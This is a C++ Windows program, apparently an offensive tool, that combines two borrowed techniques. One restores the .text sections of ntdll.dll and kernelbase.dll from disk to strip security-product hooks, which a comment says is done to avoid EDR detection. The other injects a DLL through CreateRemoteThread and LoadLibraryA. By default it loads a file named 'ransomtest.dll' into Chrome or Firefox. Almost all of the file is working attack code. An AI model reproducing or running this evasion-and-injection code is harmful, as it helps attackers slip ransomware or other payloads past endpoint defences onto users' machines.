#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <sstream>
#include <thread>
#include <psapi.h>
#include <fstream>

using namespace std;

// From: https://inf0sec.fr/article-20.php
int unHook(const string &name)
{
	cout << "Unhooking " << name << endl;
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(name.c_str());
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA(("C:\\windows\\system32\\" + name).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		if (!strcmp((char *)hookedSectionHeader->Name, (char *)".text"))
		{
			DWORD oldProtection = 0;
			BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
	return 0;
}

// From: https://github.com/Zer0Mem0ry/StandardInjection
bool inject(DWORD ProcessID, LPCSTR DllPath)
{
	// Open a handle to target process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);

	// Allocate memory for the dllpath in the target process
	// length of the path string + null terminator
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1,
									 MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		cout << "VirtualAllocEx failed" << endl;
		return false;
	}

	// Write the path to the address of the memory we just allocated
	// in the target process
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath,
					   strlen(DllPath) + 1, 0);

	// Create a Remote Thread in the target process which
	// calls LoadLibraryA as our dllpath as an argument -> program loads our dll
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
											(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
																				   "LoadLibraryA"),
											pDllPath, 0, 0);

	// Wait for the execution of our loader thread to finish
	WaitForSingleObject(hLoadThread, INFINITE);

	std::cout << "Dll path allocated at: " << std::hex << pDllPath << std::endl;
	std::cin.get();

	// Free the memory allocated for our dll path
	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);
	return true;
}

DWORD getPidByName(LPCSTR processName)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot)
	{
		PROCESSENTRY32 process;
		ZeroMemory(&process, sizeof(process));
		process.dwSize = sizeof(process);

		// Walkthrough all processes.
		if (Process32First(snapshot, &process))
		{
			do
			{
				if (string(process.szExeFile) == string(processName))
				{
					pid = process.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &process));
		}
		CloseHandle(snapshot);
	}
	return pid;
}

bool injectByName(LPCSTR processName, LPCSTR dllPath)
{
	DWORD pid = getPidByName(processName);
	if (pid != 0)
	{
		cout << "Found " << processName << " with PID: " << pid << endl;
		return inject(pid, dllPath);
	}
	cout << "Could not find " << processName << endl;
	return false;
}

int main(int argc, char *argv[])
{
	// unhook ntdll.dll and kernelbase.dll to be able to inject our dll without EDR detection
	Sleep(2000);
	unHook("ntdll.dll");
	Sleep(2000);
	unHook("kernelbase.dll");
	Sleep(2000);

	// Execute ransomtest.dll with chrome and firefox by default if no arguments are given
	if (argc == 1 && fstream("ransomtest.dll", ios::in).good())
	{
		// Get absolute path to dll
		char path[MAX_PATH];
		GetModuleFileNameA(NULL, path, MAX_PATH);
		string::size_type pos = string(path).find_last_of("\\/");
		string dllPath = string(path).substr(0, pos) + "\\ransomtest.dll";
		cout << "Found ransomtest.dll at: " << dllPath << endl;

		injectByName("chrome.exe", dllPath.c_str()) || injectByName("firefox.exe", dllPath.c_str());
		return 0;
	}

	// Help
	if (argc != 3)
	{
		cout << "Usage: injectdll.exe <process name> <dll path>" << endl;
		return 1;
	}

	// Run with args
	LPCSTR processName = argv[1];
	LPCSTR dllPath = argv[2];
	injectByName(processName, dllPath);
}
